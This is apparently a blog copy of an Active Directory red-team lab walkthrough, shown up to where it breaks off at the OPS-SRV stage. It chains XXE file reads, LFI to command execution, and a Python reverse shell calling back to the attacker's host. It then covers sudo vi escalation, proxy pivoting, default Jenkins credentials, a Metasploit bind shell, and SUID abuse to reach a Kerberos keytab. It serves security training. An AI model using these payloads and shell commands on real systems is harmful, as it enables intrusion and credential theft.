

  <!DOCTYPE html>
  <html lang="en" data-default-color-scheme=&#34;dark&#34; >
  <style>
    .text1
    {
    text-shadow: 0px 0px 2px #f2f3f2;
    }
    </style>

  

<head>
  <meta charset="UTF-8">
  <link rel="apple-touch-icon" sizes="76x76" href="/null">
  <link rel="icon" type="image/png" href="/null">
  <meta name="viewport"
        content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no, shrink-to-fit=no">
  <meta http-equiv="x-ua-compatible" content="ie=edge">
  
  <meta name="theme-color" content="#2f4154">
  <meta name="description" content="">
  <meta name="author" content="John Doe">
  <meta name="keywords" content="">
  <title>攻击链七：域渗透案例四 - whale3070&#39;s blog</title>

  <link  rel="stylesheet" href="https://cdn.jsdelivr.net/npm/bootstrap@4.5.3/dist/css/bootstrap.min.css" />


  <link  rel="stylesheet" href="https://cdn.jsdelivr.net/npm/github-markdown-css@4.0.0/github-markdown.min.css" />
  <link  rel="stylesheet" href="/lib/hint/hint.min.css" />

  
    
    
      
      <link  rel="stylesheet" href="https://cdn.jsdelivr.net/npm/highlight.js@10.4.0/styles/github-gist.min.css" />
    
  

  
    <link  rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fancyapps/fancybox@3.5.7/dist/jquery.fancybox.min.css" />
  



<!-- 主题依赖的图标库，不要自行修改 -->

<link rel="stylesheet" href="//at.alicdn.com/t/font_1749284_ba1fz6golrf.css">



<link rel="stylesheet" href="//at.alicdn.com/t/font_1736178_kmeydafke9r.css">


<link  rel="stylesheet" href="/css/main.css" />

<!-- 自定义样式保持在最底部 -->


  <script id="fluid-configs">
    var Fluid = window.Fluid || {};
    var CONFIG = {"hostname":"example.com","root":"/","version":"1.8.7","typing":{"enable":false,"typeSpeed":70,"cursorChar":"_","loop":false},"anchorjs":{"enable":true,"element":"h1,h2,h3,h4,h5,h6","placement":"right","visible":"hover","icon":""},"progressbar":{"enable":true,"height_px":3,"color":"#29d","options":{"showSpinner":false,"trickleSpeed":100}},"copy_btn":true,"image_zoom":{"enable":true},"toc":{"enable":true,"headingSelector":"h1,h2,h3,h4,h5,h6","collapseDepth":0},"lazyload":{"enable":true,"onlypost":false},"web_analytics":{"enable":false,"baidu":null,"google":null,"gtag":null,"tencent":{"sid":null,"cid":null},"woyaola":null,"cnzz":null,"leancloud":{"app_id":null,"app_key":null,"server_url":null}}};
  </script>
  <script  src="/js/utils.js" ></script>
  <script  src="/js/color-schema.js" ></script>
<meta name="generator" content="Hexo 5.4.0"></head>


    <body>
      <header style="height: 70vh;">
        <nav id="navbar" class="navbar fixed-top  navbar-expand-lg navbar-dark scrolling-navbar">
  <div class="container">
    <a class="navbar-brand"
       href="/">&nbsp;<strong>InfoSec learning</strong>&nbsp;</a>

    <button id="navbar-toggler-btn" class="navbar-toggler" type="button" data-toggle="collapse"
            data-target="#navbarSupportedContent"
            aria-controls="navbarSupportedContent" aria-expanded="false" aria-label="Toggle navigation">
      <div class="animated-icon"><span></span><span></span><span></span></div>
    </button>

    <!-- Collapsible content -->
    <div class="collapse navbar-collapse" id="navbarSupportedContent">
      <ul class="navbar-nav ml-auto text-center">
        
          
          
          
          
            <li class="nav-item">
              <a class="nav-link" href="/">
                <i class="iconfont icon-home-fill"></i>
                Home
              </a>
            </li>
          
        
          
          
          
          
            <li class="nav-item">
              <a class="nav-link" href="/archives/">
                <i class="iconfont icon-archive-fill"></i>
                Archives
              </a>
            </li>
          
        
          
          
          
          
            <li class="nav-item">
              <a class="nav-link" href="/categories/">
                <i class="iconfont icon-category-fill"></i>
                Categories
              </a>
            </li>
          
        
          
          
          
          
            <li class="nav-item">
              <a class="nav-link" href="/tags/">
                <i class="iconfont icon-tags-fill"></i>
                Tags
              </a>
            </li>
          
        
        
          <li class="nav-item" id="search-btn">
            <a class="nav-link" data-toggle="modal" data-target="#modalSearch">&nbsp;<i
                class="iconfont icon-search"></i>&nbsp;</a>
          </li>
        
        
          
        
      </ul>
    </div>
  </div>
</nav>

          <div class="banner" id="banner" false
            style="background: url('/img/default.png') no-repeat center center;
              background-size: cover;">
              <div class="full-bg-img">
                <div class="mask flex-center" style="background-color: rgba(0, 0, 0, 0.3)">
                  <div class="page-header text-center fade-in-up">
                    <span class="h2 text1" id="subtitle" title="攻击链七：域渗透案例四">
                      
                        攻击链七：域渗透案例四
                      
                    </span>
        
                    
                      <div class="mt-3">
  
  
    <span class="post-meta">
      <i class="iconfont icon-date-fill" aria-hidden="true"></i>
      <time datetime="2021-06-22 14:16" pubdate>
        June 22, 2021 pm
      </time>
    </span>
  
</div>

<div class="mt-1">
  
    
    <span class="post-meta mr-2">
      <i class="iconfont icon-chart"></i>
      3.2k 字
    </span>
  

  
    
    <span class="post-meta mr-2">
      <i class="iconfont icon-clock-fill"></i>
      
      
      64
       分钟
    </span>
  

  
  
</div>

                    
                  </div>
                    
                  </div>
                  
                </div>
              </div>
          </div>
      </header>

      <main>
        
          

<div class="container-fluid nopadding-x">
  <div class="row nomargin-x">
    <div class="d-none d-lg-block col-lg-2"></div>
    <div class="col-lg-8 nopadding-x-md">
      <div class="container nopadding-x-md" id="board-ctn">
        <div class="py-5" id="board">
          <article class="post-content mx-auto">
            <!-- SEO header -->
            <h1 style="display: none">攻击链七：域渗透案例四</h1>
            
            <div class="markdown-body">
              <h1 id="Red-teaming-Active-Directory-Lab-3-ELS-CORP-Attack-Path-2"><a href="#Red-teaming-Active-Directory-Lab-3-ELS-CORP-Attack-Path-2" class="headerlink" title="Red-teaming Active Directory Lab #3 (ELS.CORP) (Attack Path 2)"></a>Red-teaming Active Directory Lab #3 (ELS.CORP) (Attack Path 2)</h1><p><img src="https://assets.ine.com/cybersecurity-lab-images/57ee8694-facd-4535-b6c8-b4595d18ecb7/image2.png" srcset="/img/loading.gif"></p>
<h2 id="Contents"><a href="#Contents" class="headerlink" title="Contents"></a>Contents</h2><p><strong>Web Server Attack Path (Path 2)</strong></p>
<ol>
<li><p> Prod-SRV . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . .</p>
</li>
<li><p> OPS-SRV . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . .</p>
</li>
<li><p> ELS-CHILDDC . . . . . . . . . . . . . . . . . . . . . . . . . . . .</p>
</li>
<li><p> ELS-DC . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . .</p>
</li>
<li><p> MGMT-DC . . . . . . . . . . . . . . . . . . . . . . . . . . . . . .</p>
</li>
<li><p> JUMP-SRV . . . . . . . . . . . . . . . . . . . . . . . . . . . . . .</p>
</li>
<li><p> Admin-SYS . . . . . . . . . . . . . . . . . . . . . . . . . . . . .</p>
</li>
</ol>
<h2 id="Scenario"><a href="#Scenario" class="headerlink" title="Scenario"></a>Scenario</h2><p>You have been asked to execute a (black-box) red teaming exercise against eLS Corp (including any related/trusted forest). The letter of engagement has specified:</p>
<ol>
<li><p> The ADMIN-SYS system as the crown jewel. This means that the ultimate goal of this red teaming exercise is to obtain access to the ADMIN-SYS system.</p>
</li>
<li><p> That during this exercise, the web application hosted on 172.16.250.2 is included in the scope and you can exploit it to gain initial foothold</p>
</li>
<li><p> The mail server hosted on 172.16.250.2 is out of scope and should not be touched</p>
</li>
<li><p> That the pentesters’ network range is 172.16.25.0/24 and a static route has been configured so that pentesters can access the 172.16.250.0/24 network range, where eLS Corp assets exist</p>
</li>
<li><p> For any cracking activities use the <em>/usr/share/wordlists/rockyou.txt</em> wordlist, included in latest Kali’s</p>
</li>
</ol>
<h2 id="Hints"><a href="#Hints" class="headerlink" title="Hints"></a>Hints</h2><p>Refer to the attack path diagram of page 1 only when you are out of options.</p>
<ol>
<li> <strong>Prod-SRV Server</strong></li>
</ol>
<p>Scanning the accessible IP range from the scope of engagement provides us with two possible entry points both residing on the “<strong>172.16.250.2</strong>“ IP. Specifically, scanning the TCP ports of <strong>172.16.250.2</strong> tells us that an SMTP server and a web application are running on TCP ports 25 and 80. According to the letter of engagement, the SMTP server is out of scope.</p>
<p><img src="https://assets.ine.com/cybersecurity-lab-images/57ee8694-facd-4535-b6c8-b4595d18ecb7/image3.jpeg" srcset="/img/loading.gif"></p>
<p><img src="https://assets.ine.com/cybersecurity-lab-images/57ee8694-facd-4535-b6c8-b4595d18ecb7/image4.png" srcset="/img/loading.gif"></p>
<p>Accessing port 80 through a web browser reveals that a web service is running with a login/registration</p>
<p>functionality.</p>
<p><img src="https://assets.ine.com/cybersecurity-lab-images/57ee8694-facd-4535-b6c8-b4595d18ecb7/image5.jpeg" srcset="/img/loading.gif"></p>
<p>Registering and checking the request and response from the portal suggests that XML technology is used to transfer information from the client to the server. Let’s check if the portal is vulnerable to XML External Entity (XXE) attacks.</p>
<p>Using the following XXE payload after capturing the request in the web portal leads to internal file disclosure.</p>
<figure class="highlight xml"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs xml"><span class="hljs-meta">&lt;?xml version=&quot;1.0&quot; encoding=&quot;UTF−8&quot;?&gt;</span><br><span class="hljs-meta">&lt;!DOCTYPE <span class="hljs-meta-keyword">abc</span> [</span><br><span class="hljs-meta"><span class="hljs-meta">&lt;!ENTITY <span class="hljs-meta-keyword">ab</span> <span class="hljs-meta-keyword">SYSTEM</span> <span class="hljs-meta-string">&quot;file:///etc/passwd&quot;</span>&gt;</span></span><br><span class="hljs-meta">]&gt;</span><br><br><span class="hljs-tag">&lt;<span class="hljs-name">root</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">name</span>&gt;</span><span class="hljs-symbol">&amp;ab;</span><span class="hljs-tag">&lt;/<span class="hljs-name">name</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">tel</span>&gt;</span>11111111<span class="hljs-tag">&lt;/<span class="hljs-name">tel</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">email</span>&gt;</span>yb@sq.co<span class="hljs-tag">&lt;/<span class="hljs-name">email</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">password</span>&gt;</span>12345<span class="hljs-tag">&lt;/<span class="hljs-name">password</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">root</span>&gt;</span><br></code></pre></div></td></tr></table></figure>

<p>Through internal file disclosing, sensitive information can easily be obtained (through the XXE vulnerability). For now, we will look for the “<strong>/etc/passwd</strong>“ file.</p>
<p><img src="https://assets.ine.com/cybersecurity-lab-images/57ee8694-facd-4535-b6c8-b4595d18ecb7/image6.jpeg" srcset="/img/loading.gif"></p>
<p>A local user named “<strong>prod-admin</strong>“ is clearly visible in the “<strong>/etc/passwd</strong>“ file, let’s enumerate more to see if we can gain some more information about the discovered user.</p>
<p>Looking at the “.<strong>bash_history</strong>“ file of the “<strong>prod-admin</strong>“ user, another internal file is disclosed which cannot be obtained via directory brute-forcing.</p>
<figure class="highlight xml"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs xml"><span class="hljs-meta">&lt;?xml version=&quot;1.0&quot; encoding=&quot;UTF−8&quot;?&gt;</span><br><span class="hljs-meta">&lt;!DOCTYPE <span class="hljs-meta-keyword">abc</span> [</span><br><span class="hljs-meta"><span class="hljs-meta">&lt;!ENTITY <span class="hljs-meta-keyword">ab</span> <span class="hljs-meta-keyword">SYSTEM</span> <span class="hljs-meta-string">&quot;file:///home/prod-admin/.bash_history&quot;</span>&gt;</span></span><br><span class="hljs-meta">]&gt;</span><br><br><span class="hljs-tag">&lt;<span class="hljs-name">root</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">name</span>&gt;</span><span class="hljs-symbol">&amp;ab;</span><span class="hljs-tag">&lt;/<span class="hljs-name">name</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">tel</span>&gt;</span>11111111<span class="hljs-tag">&lt;/<span class="hljs-name">tel</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">email</span>&gt;</span>yb@sq.co<span class="hljs-tag">&lt;/<span class="hljs-name">email</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">password</span>&gt;</span>12345<span class="hljs-tag">&lt;/<span class="hljs-name">password</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">root</span>&gt;</span><br></code></pre></div></td></tr></table></figure>

<p>The interesting internal files disclosed are located at <strong>‘/var/www/html/Lab-User.php</strong>‘ and <strong>‘/var/www/Lab-Admin.php</strong>‘.</p>
<p><img src="https://assets.ine.com/cybersecurity-lab-images/57ee8694-facd-4535-b6c8-b4595d18ecb7/image7.jpeg" srcset="/img/loading.gif"></p>
<p>However, we cannot read the files directly, we will use php filter as our workaround to disclose file contents in base64 format and then convert it to a readable format.</p>
<p>The content of the <strong>“/var/www/html/Lab-User.php</strong>“ file can be viewed, as follows:</p>
<p><img src="https://assets.ine.com/cybersecurity-lab-images/57ee8694-facd-4535-b6c8-b4595d18ecb7/image8.jpeg" srcset="/img/loading.gif"></p>
<p>Copy the Base64 string from the response body of Burp Suite and then use the following command to read the contents in a readable format.</p>
<p><img src="https://assets.ine.com/cybersecurity-lab-images/57ee8694-facd-4535-b6c8-b4595d18ecb7/image9.jpeg" srcset="/img/loading.gif"></p>
<p>From the file <strong>“/var/www/html/Lab-User.php</strong>“ an input parameter “<strong>page</strong>“ is disclosed which can be used to include files as parameters in the URL.</p>
<p>Similarly, the content of the <strong>“/var/www/Lab-Admin.php</strong>“ file can also be viewed using the PHP filter.</p>
<p><img src="https://assets.ine.com/cybersecurity-lab-images/57ee8694-facd-4535-b6c8-b4595d18ecb7/image10.jpeg" srcset="/img/loading.gif"></p>
<p>A URL parameter ‘<strong>cmd</strong>‘ is disclosed for command execution inside ‘<strong>Lab-Admin.php</strong>‘</p>
<p>This means that the file “<strong>Lab-User.php</strong>“ can be used to include another file and the “<strong>Lab-Admin.php</strong>“ file can be used to execute commands.</p>
<p>Command execution can be achieved, as follows.</p>
<p><img src="https://assets.ine.com/cybersecurity-lab-images/57ee8694-facd-4535-b6c8-b4595d18ecb7/image11.png" srcset="/img/loading.gif"></p>
<p>We have successfully exploited the portal through the below vulnerability chain:</p>
<p>“<strong>XXE → LFI → RCE</strong>“</p>
<p>Next step would be to establish a stable reverse shell leveraging RCE for initial access. Use the following command to get a reverse shell from the “<strong>Prod-SRV</strong>“ server.</p>
<figure class="highlight apache"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs apache"><span class="hljs-attribute">http</span>://<span class="hljs-number">172.16.250.2</span>/Lab-User.php?page=../Lab-Admin.php&amp;cmd=python -c import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((<span class="hljs-string">&quot;172.16.25.x&quot;</span>,<span class="hljs-number">4444</span>));os.dup<span class="hljs-number">2</span>(s.fileno(),<span class="hljs-number">0</span>);os.dup<span class="hljs-number">2</span>(s.fileno(),<span class="hljs-number">1</span>);os.dup<span class="hljs-number">2</span>(s.fileno(),<span class="hljs-number">2</span>);p=subprocess.call([<span class="hljs-string">&quot;/bin/sh&quot;</span>,<span class="hljs-string">&quot;-i&quot;</span>]);<br></code></pre></div></td></tr></table></figure>

<p>We will be using Metasploit “<strong>multi/handler”</strong> module to receive the reverse shell.</p>
<figure class="highlight gams"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs gams">use exploit/multi/handler<br><span class="hljs-keyword">set</span> payload <span class="hljs-comment">cmd</span>/unix/<span class="hljs-comment">reverse_python</span><br><span class="hljs-keyword">set</span> <span class="hljs-comment">LHOST &lt;attacking_IP&gt;</span><br><span class="hljs-keyword">set</span> <span class="hljs-comment">LPORT &lt;listening_port&gt;</span><br>run <span class="hljs-comment">-j</span><br></code></pre></div></td></tr></table></figure>

<p>Reverse shell of Prod-SRV server.</p>
<p><img src="https://assets.ine.com/cybersecurity-lab-images/57ee8694-facd-4535-b6c8-b4595d18ecb7/image12.jpeg" srcset="/img/loading.gif"></p>
<p>Neat! We have a shell with ‘<strong>www-data’</strong> privileges. Upgrade the session to stable meterpreter session.</p>
<p><img src="https://assets.ine.com/cybersecurity-lab-images/57ee8694-facd-4535-b6c8-b4595d18ecb7/image13.jpeg" srcset="/img/loading.gif"></p>
<p>For privilege escalation, “<strong>www-data</strong>“ user can execute “<strong>sudo</strong>“ with “<strong>vi</strong>“ as prod-admin user, this can be checked &amp; abused as follows:</p>
<figure class="highlight awk"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs awk">𝑠ℎ𝑒𝑙𝑙<br>𝑝𝑦𝑡ℎ𝑜𝑛 −𝑐 “𝑖𝑚𝑝𝑜𝑟𝑡 𝑝𝑡𝑦;𝑝𝑡𝑦.𝑠𝑝𝑎𝑤𝑛(‘<span class="hljs-regexp">/𝑏𝑖𝑛/</span>𝑏𝑎𝑠ℎ’);”<br>𝑠𝑢𝑑𝑜 −𝑙<br><br>&lt;𝑅𝑒𝑠𝑢𝑙𝑡&gt;<br>𝑈𝑠𝑒𝑟 𝑤𝑤𝑤−𝑑𝑎𝑡𝑎 𝑚𝑎𝑦 𝑟𝑢𝑛 𝑡ℎ𝑒 𝑓𝑜𝑙𝑙𝑜𝑤𝑖𝑛𝑔 𝑐𝑜𝑚𝑚𝑎𝑛𝑑𝑠 𝑜𝑛 𝑃𝑟𝑜𝑑−𝑆𝑟𝑣:<br>(𝒑𝒓𝒐𝒅−𝒂𝒅𝒎𝒊𝒏) <span class="hljs-regexp">/𝒖𝒔𝒓/</span>𝒃𝒊𝒏/𝒗𝒊, 𝑵𝑶𝑷𝑨𝑺𝑺𝑾𝑫:𝑨𝑳𝑳<br>&lt;/𝑅𝑒𝑠𝑢𝑙𝑡&gt;<br><br>𝑠𝑢𝑑𝑜 −𝑢 𝑝𝑟𝑜𝑑−𝑎𝑑𝑚𝑖𝑛 𝑣𝑖<br>𝑃𝑟𝑒𝑠𝑠 “𝑬𝑺𝑪 +∶ ”<br>!<span class="hljs-regexp">/𝑏𝑖𝑛/</span>𝑠ℎ<br>𝑏𝑎𝑠ℎ −𝑖<br>𝑤ℎ𝑜𝑎𝑚𝑖<br><br>&lt;𝑅𝑒𝑠𝑢𝑙𝑡&gt;<br>𝑷𝒓𝒐𝒅−𝒂𝒅𝒎𝒊𝒏<br>&lt;/𝑅𝑒𝑠𝑢𝑙𝑡&gt;<br></code></pre></div></td></tr></table></figure>

<p>Escalated to “<strong>prod-admin</strong>“ user.</p>
<p><img src="https://assets.ine.com/cybersecurity-lab-images/57ee8694-facd-4535-b6c8-b4595d18ecb7/image14.png" srcset="/img/loading.gif"></p>
<p>However, to move forward we need an internal IP address. Interestingly enough, this machine does not have another interface. If you recall, during enumeration we found that the “<strong>.bash_history</strong>“ of the prod-admin user contains links to some log files.</p>
<p>The “<strong>10.10.2.4</strong>“ IP address can be spotted on the “<strong>/var/log/auth.log</strong>“ file.</p>
<p><strong>Note</strong>: if the log is filled, it is automatically shifted to “/var/log/auth.log.1” or ‘/var/log/auth.log.2’ and so on, check this too if the IP address is not found.</p>
<p><img src="https://assets.ine.com/cybersecurity-lab-images/57ee8694-facd-4535-b6c8-b4595d18ecb7/image15.png" srcset="/img/loading.gif"></p>
<p>With the discovered <strong>“10.10.2.4”</strong> IP address we will add a route to the “10.10.2.0/24” network and start a socks server.</p>
<figure class="highlight awk"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs awk">On meterpreter prompt<br><br>𝑟𝑜𝑢𝑡𝑒 𝑎𝑑𝑑 <span class="hljs-number">10.10</span>.<span class="hljs-number">2.0</span>/<span class="hljs-number">24</span> &lt;𝑠𝑒𝑠𝑠𝑖𝑜𝑛_𝐼𝐷&gt;<br>𝑟𝑜𝑢𝑡𝑒<br><br>Start SOCKS server<br>𝑢𝑠𝑒 𝑎𝑢𝑥𝑖𝑙𝑖𝑎𝑟𝑦<span class="hljs-regexp">/𝑠𝑒𝑟𝑣𝑒𝑟/</span>𝑠𝑜𝑐𝑘𝑠<span class="hljs-number">4</span>𝑎<br>𝑠ℎ𝑜𝑤 𝑜𝑝𝑡𝑖𝑜𝑛𝑠<br>𝑠𝑒𝑡 𝑆𝑅𝑉𝐻𝑂𝑆𝑇 <span class="hljs-number">172.16</span>.<span class="hljs-number">25</span>.𝑥<br>𝑠𝑒𝑡 𝑆𝑅𝑉𝑃𝑂𝑅𝑇 &lt;𝑙𝑖𝑠𝑡𝑒𝑛𝑖𝑛𝑔_𝑝𝑜𝑟𝑡&gt;<br>𝑟𝑢𝑛 −𝑗<br><br>Modify <span class="hljs-regexp">/etc/</span>proxychains.conf<br>𝑠𝑜𝑐𝑘𝑠<span class="hljs-number">4</span>𝑎 <span class="hljs-number">172.16</span>.<span class="hljs-number">25</span>.𝑥 <span class="hljs-number">1080</span><br></code></pre></div></td></tr></table></figure>

<p>Now, we will scan the TCP ports of the discovered IP address “<strong>10.10.2.4</strong>“.</p>
<ol>
<li> <strong>OPS-SRV Server</strong></li>
</ol>
<p>Leveraging the route to the “10.10.2.0/24” network and scanning TCP ports using proxychains reveals that a web server is running on 8080.</p>
<p><img src="https://assets.ine.com/cybersecurity-lab-images/57ee8694-facd-4535-b6c8-b4595d18ecb7/image16.png" srcset="/img/loading.gif"></p>
<p>Open Firefox (or any web browser) with proxychains and point the browser to port <strong>8080</strong> of <strong>10.10.2.4</strong></p>
<p><strong>URL: <a target="_blank" rel="noopener" href="http://10.10.2.4:8080/">http://10.10.2.4:8080</a></strong></p>
<p><img src="https://assets.ine.com/cybersecurity-lab-images/57ee8694-facd-4535-b6c8-b4595d18ecb7/image17.jpeg" srcset="/img/loading.gif"></p>
<p>A Jenkins server is running with guessable credentials. Specifically, <strong>“admin/admin”</strong> is a valid set of username/password.</p>
<p>After authentication, it is found that the ‘<strong>admin’</strong> user has view-only rights. Browsing straight to the credentials store, clear text credentials of “<strong>Jenkins-admin</strong>“ can be been found.</p>
<figure class="highlight livecodeserver"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs livecodeserver">Browse <span class="hljs-built_in">to</span>:<br><span class="hljs-keyword">http</span>://<span class="hljs-number">10.10</span><span class="hljs-number">.2</span><span class="hljs-number">.4</span>:<span class="hljs-number">8080</span><br><br>Authenticate <span class="hljs-keyword">with</span>:<br>𝑎𝑑𝑚𝑖𝑛/𝑎𝑑𝑚𝑖𝑛<br><br>Head straight <span class="hljs-built_in">to</span> <span class="hljs-keyword">the</span> credentials store, <span class="hljs-keyword">the</span> following credentials were found:<br>𝑗𝑒𝑛𝑘𝑖𝑛𝑠−𝑎𝑑𝑚𝑖𝑛\𝐴𝑑𝑚!𝑛@𝐽<span class="hljs-number">3</span>𝑛𝑘!𝑛𝑠<br></code></pre></div></td></tr></table></figure>

<p>Logout and login again as “<strong>jenkins-admin</strong>“ using the identified credentials.</p>
<p><img src="https://assets.ine.com/cybersecurity-lab-images/57ee8694-facd-4535-b6c8-b4595d18ecb7/image18.png" srcset="/img/loading.gif"></p>
<p>We can establish a shell with the “<strong>ops-srv</strong>“ machine by building and executing a malicious task. In order to do so we will use Metasploit’s “<strong>jenkins_script_console</strong>“ module.</p>
<figure class="highlight awk"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs awk">Configure Exploit:<br>𝑢𝑠𝑒 𝑒𝑥𝑝𝑙𝑜𝑖𝑡<span class="hljs-regexp">/𝑚𝑢𝑙𝑡𝑖/</span>ℎ𝑡𝑡𝑝/𝑗𝑒𝑛𝑘𝑖𝑛𝑠_𝑠𝑐𝑟𝑖𝑝𝑡_𝑐𝑜𝑛𝑠𝑜𝑙𝑒<br>𝑠𝑒𝑡 𝑡𝑎𝑟𝑔𝑒𝑡 <span class="hljs-number">1</span><br>𝑠𝑒𝑡 𝑇𝐴𝑅𝐺𝐸𝑇𝑈𝑅𝐼 /<br>𝑠𝑒𝑡 𝑅𝑃𝑂𝑅𝑇 <span class="hljs-number">8080</span><br>𝑠𝑒𝑡 𝑈𝑆𝐸𝑅𝑁𝐴𝑀𝐸 𝑗𝑒𝑛𝑘𝑖𝑛𝑠−𝑎𝑑𝑚𝑖𝑛<br>𝑠𝑒𝑡 𝑃𝐴𝑆𝑆𝑊𝑂𝑅𝐷 𝐴𝑑𝑚!𝑛@𝐽<span class="hljs-number">3</span>𝑛𝑘!𝑛𝑠<br><br>Configure Payload:<br>𝑠𝑒𝑡 𝑝𝑎𝑦𝑙𝑜𝑎𝑑 𝑙𝑖𝑛𝑢𝑥<span class="hljs-regexp">/𝑥86/</span>𝑠ℎ𝑒𝑙𝑙_𝑏𝑖𝑛𝑑_𝑡𝑐𝑝<br>𝑠𝑒𝑡 𝑟ℎ𝑜𝑠𝑡 <span class="hljs-number">10.10</span>.<span class="hljs-number">2.4</span><br>𝑠𝑒𝑡 𝑣𝑒𝑟𝑏𝑜𝑠𝑒 𝑡𝑟𝑢𝑒<br>run<br></code></pre></div></td></tr></table></figure>

<p>Executing the module results in a bind shell on “<strong>OPS-SRV</strong>“ server.</p>
<p><img src="https://assets.ine.com/cybersecurity-lab-images/57ee8694-facd-4535-b6c8-b4595d18ecb7/image19.jpeg" srcset="/img/loading.gif"></p>
<p>Interestingly, this machine is domain joined which can be confirmed through the presence of a ‘/etc/krb5.conf’ file or successful execution of the command “<em>kinit -k host/$(hostname -f)</em>“.</p>
<p>With access to the “OPS-SRV” machine we will look for any credentials/tickets that can move us forward. After enumeration, a keytab file is located at “<strong>/var/lib/jenkins/support.keytab</strong>“.</p>
<p>But there is a problem… We do not have access to the keytab file because it is owned by another user ‘<strong>opsadmin</strong>‘. We need to somehow become opsadmin or get his privileges.</p>
<p>Hopefully, during some priv-esc enumeration, a file named “<strong>find</strong>“ was found located at <strong>“/var/lib/jenkins/find</strong>“ which has SUID bit set.</p>
<figure class="highlight gradle"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs gradle">Check <span class="hljs-keyword">if</span> OPS-SRV is domain joined or not:<br>𝑘𝑖𝑛𝑖𝑡 −𝑘 ℎ𝑜𝑠𝑡/$(ℎ𝑜𝑠𝑡𝑛𝑎𝑚𝑒 −𝑓)<br><br>Keytab <span class="hljs-keyword">file</span> found at:<br><span class="hljs-regexp">/𝑣𝑎𝑟/</span>𝑙𝑖𝑏<span class="hljs-regexp">/𝑗𝑒𝑛𝑘𝑖𝑛𝑠/</span>𝑠𝑢𝑝𝑝𝑜𝑟𝑡.𝑘𝑒𝑦𝑡𝑎𝑏<br><br>Get opsadmin privileges, SUID check:<br>𝑓𝑖𝑛𝑑 <span class="hljs-regexp">/ −𝑝𝑒𝑟𝑚 −𝑢=𝑠 −𝑡𝑦𝑝𝑒 𝑓 2&gt;/</span>𝑑𝑒𝑣/𝑛𝑢𝑙𝑙<br>&lt;Result&gt; <span class="hljs-regexp">/𝒗𝒂𝒓/</span>𝒍𝒊𝒃<span class="hljs-regexp">/𝒋𝒆𝒏𝒌𝒊𝒏𝒔/</span>𝒇𝒊𝒏𝒅 &lt;/Result&gt;<br></code></pre></div></td></tr></table></figure>

<p>Using the file ‘<strong>find’</strong>, we will change the permissions of ‘<strong>support.keytab</strong>‘ file and request a new ticket.</p>
<p><img src="https://assets.ine.com/cybersecurity-lab-images/57ee8694-facd-4535-b6c8-b4595d18ecb7/image20.png" srcset="/img/loading.gif"></p>
<p>Escalate to “<strong>opsadmin</strong>“ user and request a new TGT for support user, as follows.</p>
